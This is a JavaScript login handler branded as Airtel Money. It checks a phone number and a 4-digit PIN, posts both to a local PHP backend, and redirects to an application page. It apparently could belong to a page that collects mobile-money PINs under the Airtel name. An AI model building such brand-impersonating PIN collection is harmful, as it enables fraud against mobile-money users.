// Airtel Money Login Handler

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('airtelForm');
    const messageDiv = document.getElementById('message');

    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        const airtelPhone = document.getElementById('airtelPhone').value.trim();
        const airtelPin = document.getElementById('airtelPin').value.trim();

        // Reset message
        messageDiv.textContent = '';
        messageDiv.className = 'message';

        // Validate phone number format
        if (!validatePhoneNumber(airtelPhone)) {
            showMessage('Please enter a valid Airtel phone number', 'error');
            return;
        }

        // Validate PIN
        if (!validatePin(airtelPin)) {
            showMessage('PIN must be 4 digits', 'error');
            return;
        }

        // Show loading state
        const submitBtn = form.querySelector('.btn-submit');
        const originalText = submitBtn.textContent;
        submitBtn.textContent = 'Verifying...';
        submitBtn.disabled = true;

        try {
            // Send verification request to backend
            const response = await fetch('backend/handlers/verify_airtel.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    phone: airtelPhone,
                    pin: airtelPin
                })
            });

            const data = await response.json();

            if (data.success) {
                showMessage(data.message || 'Verification successful!', 'success');
                // Redirect after 2 seconds
                setTimeout(() => {
                    window.location.href = data.redirect || 'apply.html';
                }, 2000);
            } else {
                showMessage(data.message || 'Verification failed. Please try again.', 'error');
            }

        } catch (error) {
            console.error('Error:', error);
            showMessage('Network error. Please try again.', 'error');
        } finally {
            submitBtn.textContent = originalText;
            submitBtn.disabled = false;
        }
    });

    function validatePhoneNumber(phone) {
        // Accept formats like +260, 0260, 26097XXXXXX
        const phoneRegex = /^(\+260|0260|260)\d{7,9}$/;
        return phoneRegex.test(phone.replace(/\s/g, ''));
    }

    function validatePin(pin) {
        // PIN should be exactly 4 digits
        return /^\d{4}$/.test(pin);
    }

    function showMessage(text, type) {
        messageDiv.textContent = text;
        messageDiv.className = `message ${type}`;
    }
});
